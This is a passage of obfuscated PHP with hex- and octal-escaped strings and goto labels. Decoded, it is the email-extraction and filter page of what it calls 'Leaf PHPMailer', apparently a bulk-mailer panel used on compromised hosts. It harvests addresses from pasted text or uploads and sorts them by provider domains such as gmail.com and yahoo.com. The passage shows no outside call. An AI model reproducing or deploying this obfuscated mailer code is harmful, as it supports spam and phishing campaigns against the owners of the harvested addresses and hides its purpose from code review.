($_POST["\163\165\142\x6d\x69\164"] == "\x65\170\164\162\x61\x63\164") { $pattern = "\x2f\x5b\101\55\x5a\x61\55\x7a\60\55\71\x2e\x5f\x25\x2b\55\x5d\x2b\x40\133\x41\55\132\141\x2d\x7a\60\55\71\x2e\55\x5d\53\134\x2e\133\101\x2d\x5a\141\55\172\x5d\x7b\62\x2c\64\x7d\57"; preg_match_all($pattern, $_POST["\145\x6d\141\x69\154\114\x69\163\x74"], $matches); foreach ($matches[0] as $email) { print $email . "\xa"; } } elseif ($_POST["\x73\165\x62\x6d\x69\164"] == "\x66\x69\x6c\x74\145\x72") { $emails = explode("\xa", $_POST["\x65\x6d\x61\151\x6c\x4c\x69\x73\x74"]); $keywords = explode("\xa", strtolower($_POST["\153\145\x79\167\x6f\162\x64\163"])); foreach ($emails as $email) { foreach ($keywords as $keyword) { if (strstr($email, $keyword)) { print $email . "\xa"; break; } } } } die; } leafheader(); print "\74\x64\x69\166\x20\x63\x6c\x61\x73\x73\x3d\x22\143\x6f\156\x74\141\x69\156\145\162\40\x63\157\154\55\154\147\55\64\x22\x3e\74\x68\63\76\74\x66\157\x6e\x74\40\x63\x6f\x6c\x6f\162\x3d\42\147\162\x65\145\x6e\42\76\74\x73\160\x61\x6e\x20\x63\x6c\141\x73\163\75\x22\x67\154\171\160\x68\151\x63\x6f\x6e\40\147\154\x79\x70\x68\x69\143\157\156\55\x6c\145\x61\146\x22\76\x3c\57\163\x70\141\x6e\76\x3c\x2f\x66\157\156\164\x3e\40\114\145\141\x66\x20\x50\110\x50\x4d\141\151\x6c\x65\162\40\74\x73\x6d\141\x6c\154\76\105\x6d\141\151\x6c\40\106\151\154\x74\145\162\x3c\x2f\x73\155\141\154\x6c\76\x3c\x2f\150\63\x3e"; print "\12\x20\40\x20\40\74\x66\x6f\162\155\x20\141\x63\164\x69\157\156\75\42\77\x65\155\x61\x69\154\x66\151\154\164\145\162\x3d\x69\146\x72\x61\x6d\42\x20\155\145\164\x68\x6f\144\75\x22\120\117\x53\x54\42\x20\164\x61\x72\x67\145\x74\75\42\155\171\x2d\151\x66\162\x61\x6d\145\42\40\145\156\x63\164\171\160\145\x3d\x22\x6d\x75\x6c\x74\151\x70\x61\x72\164\57\x66\x6f\162\155\x2d\144\141\x74\x61\42\40\x6f\156\163\x75\142\x6d\x69\x74\x3d\x27\47\x3e\12\x20\x20\40\40\x20\40\x20\x20\74\x6c\141\x62\145\x6c\40\146\157\x72\75\42\145\155\x61\x69\x6c\x4c\151\x73\164\42\x3e\124\x65\x78\x74\x20\x3c\x2f\x6c\141\142\145\x6c\x3e\74\x69\156\160\x75\x74\40\x74\171\x70\145\x3d\42\x66\x69\154\x65\42\40\156\x61\x6d\x65\x3d\42\146\151\x6c\x65\x54\x6f\x55\x70\x6c\x6f\x61\144\x22\40\x69\144\x3d\42\146\151\154\x65\124\157\125\x70\x6c\157\x61\x64\x22\76\x20\xa\x20\x20\x20\40\x20\x20\x20\x20\157\162\xa\12\x20\x20\40\40\40\40\x20\40\74\164\145\x78\164\x61\x72\x65\141\x20\x6e\x61\155\145\75\42\145\x6d\x61\151\x6c\x4c\151\x73\x74\x22\40\x69\144\75\x22\145\x6d\141\x69\x6c\x4c\151\x73\x74\42\40\143\x6c\x61\x73\163\x3d\x22\x66\x6f\162\155\55\143\x6f\x6e\x74\x72\157\x6c\42\x20\x72\157\167\x73\x3d\x22\x37\x22\x20\x69\x64\x3d\x22\164\x65\170\x74\x41\162\x65\141\42\x3e\x3c\x2f\164\x65\170\x74\141\x72\x65\141\x3e\xa\40\40\40\40\x20\40\x3c\144\x69\x76\40\143\154\x61\163\163\75\42\x63\x6f\154\x2d\154\x67\55\61\x32\x22\x3e\12\x20\40\40\x20\40\x20\x20\40\x3c\144\x69\x76\40\143\x6c\141\163\163\x3d\42\x72\x61\x64\x69\x6f\42\76\12\40\x20\x20\x20\40\x20\40\40\40\40\74\154\x61\x62\x65\x6c\76\12\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\x20\x3c\151\156\x70\x75\164\40\x74\171\x70\x65\75\x22\162\x61\144\x69\x6f\x22\40\x6e\141\155\x65\x3d\x22\162\145\x73\x75\154\x74\x74\x79\160\x65\x22\x20\x69\x64\x3d\42\162\x65\163\165\x6c\164\164\171\x70\x65\42\40\x76\141\154\x75\x65\x3d\42\150\x65\x72\x65\42\40\143\x68\x65\143\153\145\x64\x3d\x22\42\76\xa\x20\x20\x20\x20\x20\40\40\40\40\40\40\40\x53\x68\x6f\167\x20\x52\x65\x73\165\154\x74\x20\x69\156\40\164\150\x69\163\40\x70\141\147\x65\xa\40\x20\40\40\40\40\40\x20\40\x20\74\57\x6c\x61\x62\x65\x6c\76\xa\x20\x20\x20\x20\40\x20\40\x20\74\57\144\151\166\x3e\12\40\x20\40\x20\x20\40\40\40\x3c\144\151\x76\40\143\154\141\x73\163\x3d\x22\162\x61\x64\x69\157\42\x3e\12\40\x20\40\40\x20\x20\x20\x20\x20\x20\74\154\x61\x62\145\154\76\12\x20\40\x20\x20\x20\x20\x20\x20\40\x20\40\40\x3c\x69\x6e\x70\x75\164\40\x74\171\160\x65\x3d\x22\x72\141\x64\x69\157\42\40\156\141\x6d\x65\75\42\x72\x65\163\x75\154\164\x74\x79\160\145\x22\x20\x69\x64\x3d\42\x72\x65\x73\165\x6c\x74\x74\x79\160\x65\x22\x20\166\141\x6c\165\x65\75\x22\144\157\x77\156\x6c\x6f\141\144\42\76\12\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\104\x6f\x77\x6e\x6c\157\x61\x64\x20\122\x65\x73\165\154\164\x20\x28\x66\x6f\162\x20\x62\x69\147\x20\x6e\x75\155\x62\145\162\163\x29\12\x20\x20\40\x20\x20\x20\40\40\x20\40\74\x2f\154\x61\142\145\x6c\x3e\xa\x20\40\x20\x20\40\x20\40\40\x3c\57\x64\x69\x76\76\xa\x20\x20\x20\x20\40\40\x3c\57\x64\x69\x76\76\12\40\40\x20\x20\40\x20\x20\40\40\40\x20\x20\74\154\145\x67\x65\156\x64\x3e\74\150\64\76\x45\x78\164\162\141\143\164\40\x45\x6d\141\151\x6c\74\x2f\x68\x34\x3e\x3c\57\154\x65\x67\145\156\x64\x3e\xa\x20\x20\x20\40\40\40\x20\40\x20\40\40\x20\x44\145\164\x65\x63\x74\x69\156\x67\40\x65\x76\145\162\171\x20\x65\x6d\x61\x69\154\x20\x28\61\x30\60\45\51\x20\141\156\144\x20\157\162\144\x65\x72\40\164\x68\x65\155\x20\x6c\x69\156\x65\x20\x62\x79\x20\154\151\156\x65\x20\74\142\162\76\74\x62\x72\76\12\x20\40\x20\40\40\x20\x20\40\x3c\142\165\x74\x74\157\156\40\x74\171\x70\145\75\x22\x73\165\x62\x6d\151\x74\x22\x20\x6e\141\155\x65\75\x22\163\165\142\155\151\x74\x22\x20\x76\141\154\x75\145\x3d\42\x65\x78\164\162\141\143\164\42\40\143\154\141\x73\163\x3d\42\142\164\x6e\40\x62\164\156\55\x64\145\146\141\x75\154\164\40\x62\x74\x6e\x2d\163\x6d\42\76\123\x74\x61\162\164\74\57\142\x75\164\164\x6f\x6e\76\12\x20\x20\x20\40\x20\40\x20\40\40\40\x20\40\74\154\145\147\x65\x6e\x64\x3e\74\150\x34\x3e\106\x69\154\164\145\162\x20\x45\155\x61\151\154\x73\x3c\x2f\x68\x34\x3e\74\57\x6c\x65\147\x65\156\x64\76\12\x20\x20\x20\40\x20\40\40\x20\x3c\154\141\x62\145\x6c\x20\x3e\x4b\145\x79\167\157\x72\x64\x73\x20\x3c\163\x6d\141\x6c\154\76\40\145\x78\x3a\x20\147\x6d\141\151\x6c\56\143\157\x6d\40\157\x72\x20\56\143\x6f\x2e\x75\x6b\x3c\57\163\155\x61\x6c\154\x3e\x20\x3c\x2f\154\141\142\145\154\x3e\74\164\145\x78\x74\141\162\x65\141\40\x6e\141\155\x65\x3d\42\x6b\145\x79\x77\157\162\x64\163\42\x20\151\x64\75\x22\153\145\x79\167\157\162\144\163\x22\40\143\x6c\141\163\x73\x3d\42\x66\157\162\x6d\55\x63\x6f\x6e\x74\x72\x6f\x6c\x22\x20\x72\157\x77\163\75\x22\64\42\x20\x69\x64\x3d\x22\164\x65\170\x74\101\x72\145\x61\x22\76\147\x6d\x61\x69\x6c\56\143\157\x6d\12\150\157\x74\155\141\x69\x6c\x2e\x63\x6f\x6d\xa\x79\x61\x68\157\157\x2e\x63\x6f\x6d\12\56\x63\x6f\x2e\165\153\x3c\57\164\x65\x78\164\x61\162\x65\141\76\74\142\162\76\12\12\x20\40\x20\x20\x20\x20\40\40\40\40\x20\x20\74\x62\x75\x74\164\157\x6e\x20\164\x79\x70\145\75\42\x73\x75\142\x6d\x69\164\x22\x20\156\141\155\x65\x3d\x22\163\x75\x62\x6d\x69\164\42\x20\x76\141\154\x75\x65\75\42\x66\x69\154\x74\145\162\x22\40\x63\154\141\x73\x73\x3d\42\142\164\156\40\x62\x74\156\55\x64\145\x66\141\165\154\x74\x20\142\x74\156\55\x73\155\x22\76\x53\x74\141\x72\164\x3c\x2f\x62\x75\164\x74\157\156\x3e\xa\40\x20\x20\x20\x3c\x2f\146\x6f\x72\x6d\76\xa\40\40\40\40\x3c\154\x61\x62\145\154\x20\x3e\x52\145\x73\165\x6c\x74\40\74\x2f\154\141\142\145\154\76\12\x20\x20\40\x20\74\x69\x66\162\x61\155\145\40\163\x74\x79\154\145\75\x22\142\157\162\x64\x65\162\x3a\156\x6f\x6e\145\73\167\151\x64\x74\150\72\61\60\60\x25\x3b\42\x20\156\x61\x6d\x65\x3d\42\x6d\171\x2d\x69\146\162\x61\x6d\x65\42\x20\x20\x73\x72\143\75\x22\77\x65\155\141\151\x6c\146\151\154\x74\x65\x72\x3d\151\x66\x72\141\155\x22\x20\x3e\74\x2f\x69\146\x72\141\155\x65\x3e\xa\40\40\40"; die; } goto WFc4L; HwtrU: ?>